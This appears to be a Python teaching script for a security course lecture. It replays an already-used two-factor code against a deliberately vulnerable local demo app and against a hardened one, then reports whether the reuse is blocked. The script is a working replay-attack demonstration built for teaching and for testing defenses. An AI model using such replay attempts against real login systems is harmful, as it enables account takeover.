"""Replay a 2FA code that was already used (Lecture 5).

The attacker knows the admin's password and SNIFFED one valid code. We read
the code / secret from the local database to play that sniffed code.
"""
import pyotp

from common import NAIVE, NAIVE_DB, SECURE, SECURE_DB, db_rows, naive_login, report, secure_login


def run():
    first = naive_login("admin")
    first.get(NAIVE + "/login2")
    code = db_rows(NAIVE_DB, "SELECT twofa_code FROM users WHERE username = 'admin'")[0][0]
    first.post(NAIVE + "/login2", data={"code": code})
    second = naive_login("admin")                    # later, a new login
    second.post(NAIVE + "/login2", data={"code": code})
    naive_worked = "All users" in second.get(NAIVE + "/admin").text

    secret = db_rows(SECURE_DB, "SELECT totp_secret FROM users WHERE username = 'admin'")[0][0]
    code = pyotp.TOTP(secret).now()
    first = secure_login("admin")
    first.post(SECURE + "/auth/two-factor", data={"code": code})
    first_ok = first.get(SECURE + "/admin/", allow_redirects=False).status_code == 200
    first.post(SECURE + "/auth/logout")
    second = secure_login("admin")
    r = second.post(SECURE + "/auth/two-factor", data={"code": code})
    second_admin = second.get(SECURE + "/admin/", allow_redirects=False).status_code
    blocked = first_ok and r.status_code == 401 and second_admin != 200
    return report("2FA code reuse", naive_worked, "the same sniffed code logged in twice",
                  blocked, f"first use OK, same code again -> {r.status_code} 'Invalid code'")


if __name__ == "__main__":
    run()
